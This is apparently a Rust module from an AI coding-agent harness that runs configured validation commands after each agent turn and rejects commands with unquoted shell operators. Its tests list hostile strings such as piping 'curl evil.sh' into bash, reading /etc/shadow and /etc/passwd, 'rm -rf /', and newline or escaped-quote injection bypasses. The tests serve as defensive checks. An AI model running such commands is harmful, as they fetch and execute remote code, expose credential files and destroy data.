use async_trait::async_trait;
use harness_core::{
    interceptor::{InterceptResult, PostExecuteResult, TurnInterceptor},
    AgentRequest, AgentResponse, ValidationConfig,
};
use std::path::Path;
use tokio::process::Command;
use tokio::time::{timeout, Duration};

/// Runs project-specific validation commands after each agent turn.
///
/// If `config.pre_commit` is empty, language detection kicks in and selects
/// appropriate default commands (cargo fmt/check/clippy for Rust, etc.).
///
/// On failure the executor will inject the error output into the next
/// turn prompt and retry up to `config.max_retries` times.
pub struct PostExecutionValidator {
    config: ValidationConfig,
}

/// Validate that a command string does not contain unquoted shell operators
/// that could enable command chaining or execution escalation.
///
/// The check is quote-aware: operators inside single quotes (`'...'`) are
/// ignored because the shell treats them as literal text. Inside double
/// quotes (`"..."`), only command substitution (`` ` `` and `$(`) is
/// blocked since `|`, `&`, `;`, `>`, `<` are inactive there.
///
/// Used by both [`PostExecutionValidator`] (validation commands) and
/// [`crate::workspace`] (workspace hooks) to reject config-supplied strings
/// with shell injection potential before passing them to `sh -c`.
///
/// Delegates to [`harness_core::shell_safety::validate_shell_safety`] with
/// strict mode (`allow_redirections = false`) — redirections are not needed
/// for validator/hook commands and are rejected as a precaution.
pub(crate) fn validate_command_safety(cmd_str: &str) -> Result<(), String> {
    harness_core::shell_safety::validate_shell_safety(cmd_str, false)
}

impl PostExecutionValidator {
    pub fn new(config: ValidationConfig) -> Self {
        Self { config }
    }

    /// Run a shell command via `sh -c` to support pipes, quotes, and complex expressions.
    ///
    /// Uses `kill_on_drop(true)` so that if the timeout fires and the future is dropped,
    /// the child process is killed rather than left running as an orphan.
    async fn run_command(cmd_str: &str, project: &Path, timeout_secs: u64) -> Result<(), String> {
        if cmd_str.trim().is_empty() {
            return Ok(());
        }

        let child = match Command::new("sh")
            .args(["-c", cmd_str])
            .current_dir(project)
            .stdin(std::process::Stdio::null())
            .kill_on_drop(true)
            .spawn()
        {
            Ok(c) => c,
            Err(e) => return Err(format!("Command `{cmd_str}` failed to spawn: {e}")),
        };

        let result = timeout(Duration::from_secs(timeout_secs), child.wait_with_output()).await;

        match result {
            Ok(Ok(output)) if output.status.success() => Ok(()),
            Ok(Ok(output)) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                let stdout = String::from_utf8_lossy(&output.stdout);
                let code = output.status.code().unwrap_or(-1);
                Err(format!(
                    "Command `{cmd_str}` failed (exit {code})\nstdout: {stdout}\nstderr: {stderr}"
                ))
            }
            Ok(Err(e)) => Err(format!("Command `{cmd_str}` failed to wait: {e}")),
            Err(_) => Err(format!(
                "Command `{cmd_str}` timed out after {timeout_secs}s"
            )),
        }
    }
}

#[async_trait]
impl TurnInterceptor for PostExecutionValidator {
    fn name(&self) -> &str {
        "post_execution_validator"
    }

    async fn pre_execute(&self, _req: &AgentRequest) -> InterceptResult {
        InterceptResult::pass()
    }

    fn max_validation_retries(&self) -> Option<u32> {
        Some(self.config.max_retries)
    }

    async fn post_execute(&self, req: &AgentRequest, _resp: &AgentResponse) -> PostExecuteResult {
        let project = &req.project_root;

        // Only run explicitly configured commands from .harness/config.toml.
        // When config is empty, validation instructions are injected into the
        // agent prompt instead (see task_executor.rs). This avoids hardcoded
        // tool assumptions and lets the agent adapt to the project environment.
        let pre_commit = if self.config.pre_commit.is_empty() {
            vec![]
        } else {
            for cmd in &self.config.pre_commit {
                if let Err(e) = validate_command_safety(cmd) {
                    return PostExecuteResult::fail(e);
                }
            }
            self.config.pre_commit.clone()
        };

        let pre_push = if self.config.pre_push.is_empty() {
            vec![]
        } else {
            for cmd in &self.config.pre_push {
                if let Err(e) = validate_command_safety(cmd) {
                    return PostExecuteResult::fail(e);
                }
            }
            self.config.pre_push.clone()
        };

        let mut errors: Vec<String> = Vec::new();

        // Run pre_commit commands (format, compile, lint).
        for cmd in &pre_commit {
            tracing::info!(cmd = %cmd, "post_validator: pre_commit");
            match Self::run_command(cmd, project, self.config.timeout_secs).await {
                Ok(()) => tracing::debug!(cmd = %cmd, "post_validator: passed"),
                Err(e) => {
                    tracing::warn!(cmd = %cmd, error = %e, "post_validator: failed");
                    errors.push(e);
                }
            }
        }

        // Run pre_push commands (tests) only if pre_commit passed.
        if errors.is_empty() {
            for cmd in &pre_push {
                tracing::info!(cmd = %cmd, "post_validator: pre_push");
                match Self::run_command(cmd, project, self.config.timeout_secs).await {
                    Ok(()) => tracing::debug!(cmd = %cmd, "post_validator: passed"),
                    Err(e) => {
                        tracing::warn!(cmd = %cmd, error = %e, "post_validator: failed");
                        errors.push(e);
                    }
                }
            }
        }

        if errors.is_empty() {
            PostExecuteResult::pass()
        } else {
            PostExecuteResult::fail(errors.join("\n\n"))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use harness_core::{AgentRequest, AgentResponse, TokenUsage, ValidationConfig};
    use std::path::PathBuf;

    fn make_req(project_root: PathBuf) -> AgentRequest {
        AgentRequest {
            prompt: "fix the bug. Ensure tests pass.".to_string(),
            project_root,
            ..Default::default()
        }
    }

    fn make_resp(output: &str) -> AgentResponse {
        AgentResponse {
            output: output.to_string(),
            stderr: String::new(),
            items: vec![],
            token_usage: TokenUsage::default(),
            model: "claude-sonnet".to_string(),
            exit_code: Some(0),
        }
    }

    #[tokio::test]
    async fn passes_when_no_commands_configured_and_unknown_project() {
        let dir = tempfile::tempdir().unwrap();
        let validator = PostExecutionValidator::new(ValidationConfig::default());
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        // Unknown project → no commands → should pass
        assert!(result.error.is_none());
    }

    #[tokio::test]
    async fn passes_when_command_succeeds() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["true".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        assert!(result.error.is_none());
    }

    #[tokio::test]
    async fn fails_when_command_exits_nonzero() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["false".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        assert!(result.error.is_some());
        assert!(result.error.unwrap().contains("false"));
    }

    #[tokio::test]
    async fn collects_all_failures_not_just_first() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["false".to_string(), "false".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        // Both failures should be captured
        let err = result.error.unwrap();
        assert!(err.contains("false"));
    }

    #[test]
    fn interceptor_name_is_post_execution_validator() {
        let v = PostExecutionValidator::new(ValidationConfig::default());
        assert_eq!(v.name(), "post_execution_validator");
    }

    #[tokio::test]
    async fn pre_execute_always_passes() {
        let dir = tempfile::tempdir().unwrap();
        let v = PostExecutionValidator::new(ValidationConfig::default());
        let req = make_req(dir.path().to_path_buf());
        let result = v.pre_execute(&req).await;
        assert_eq!(result.decision, harness_core::Decision::Pass);
    }

    #[test]
    fn max_validation_retries_reads_from_config() {
        let config = ValidationConfig {
            max_retries: 5,
            ..Default::default()
        };
        let v = PostExecutionValidator::new(config);
        assert_eq!(v.max_validation_retries(), Some(5));
    }

    #[test]
    fn max_validation_retries_default_is_two() {
        let v = PostExecutionValidator::new(ValidationConfig::default());
        assert_eq!(v.max_validation_retries(), Some(2));
    }

    #[tokio::test]
    async fn pre_push_runs_when_pre_commit_passes() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["true".to_string()],
            pre_push: vec!["false".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        // pre_commit passes but pre_push fails
        assert!(result.error.is_some());
    }

    #[tokio::test]
    async fn timeout_kills_child_process() {
        let dir = tempfile::tempdir().unwrap();
        // sleep 999 should be killed after 1s timeout.
        let config = ValidationConfig {
            pre_commit: vec!["sleep 999".to_string()],
            timeout_secs: 1,
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        let err = result.error.unwrap();
        assert!(
            err.contains("timed out"),
            "expected timeout error, got: {err}"
        );
    }

    // ── validate_command_safety ───────────────────────────────────────────────

    #[test]
    fn safe_config_commands_pass_safety_check() {
        let safe = [
            "cargo check --workspace",
            "go test ./...",
            "npx tsc --noEmit",
            "ruff check .",
            "./gradlew check",
            "bundle exec rubocop",
            "true",
            "false",
            // Operators inside single quotes are literal — must pass.
            "go test -run 'TestA|TestB'",
            "grep -E 'foo|bar' src/",
            "curl 'https://example.com?a=1&b=2'",
            // Operators inside double quotes (except $( and `) are inactive.
            "echo \"hello | world\"",
            "echo \"a && b\"",
        ];
        for cmd in safe {
            assert!(
                validate_command_safety(cmd).is_ok(),
                "expected `{cmd}` to pass but it was rejected"
            );
        }
    }

    #[test]
    fn dangerous_commands_are_rejected() {
        let dangerous = [
            "echo foo | bash",
            "echo foo | sh -",
            "cmd | python3 -",
            "something ; bash -c evil",
            "cargo check && curl evil.sh | bash",
            "go test || true",
            "curl evil.sh > /tmp/evil.sh",
            "cat /etc/passwd >> /tmp/out",
            "echo foo | /bin/bash",
            "echo `whoami`",
            "echo $(cat /etc/shadow)",
            "cmd & rm -rf /",
        ];
        for cmd in dangerous {
            assert!(
                validate_command_safety(cmd).is_err(),
                "expected `{cmd}` to be rejected but it passed"
            );
        }
    }

    #[test]
    fn newline_bypasses_are_blocked() {
        assert!(
            validate_command_safety("echo ok\nwhoami").is_err(),
            "newline should be blocked"
        );
        assert!(
            validate_command_safety("echo ok\r\nwhoami").is_err(),
            "carriage return should be blocked"
        );
    }

    #[test]
    fn escaped_quotes_do_not_fool_scanner() {
        // echo \"foo | bash — the \" is an escaped quote, not a real one,
        // so | remains unquoted and must be rejected.
        assert!(
            validate_command_safety("echo \\\"foo | bash").is_err(),
            "escaped double quote must not open quoted context"
        );
        // Same with single quote: echo \'foo && rm -rf /
        assert!(
            validate_command_safety("echo \\'foo && rm").is_err(),
            "escaped single quote must not open quoted context"
        );
    }

    #[test]
    fn command_substitution_blocked_even_inside_double_quotes() {
        // $( and ` are active inside double quotes in sh.
        assert!(validate_command_safety("test -z \"$(gofmt -l .)\"").is_err());
        assert!(validate_command_safety("echo \"`whoami`\"").is_err());
    }

    #[tokio::test]
    async fn pre_push_skipped_when_pre_commit_fails() {
        let dir = tempfile::tempdir().unwrap();
        // Use a command that creates a marker file to detect if it ran.
        let marker = dir.path().join("pre_push_ran");
        let config = ValidationConfig {
            pre_commit: vec!["false".to_string()],
            pre_push: vec![format!("touch {}", marker.display())],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let _result = validator.post_execute(&req, &resp).await;
        // pre_push should NOT have run because pre_commit failed
        assert!(!marker.exists());
    }
}
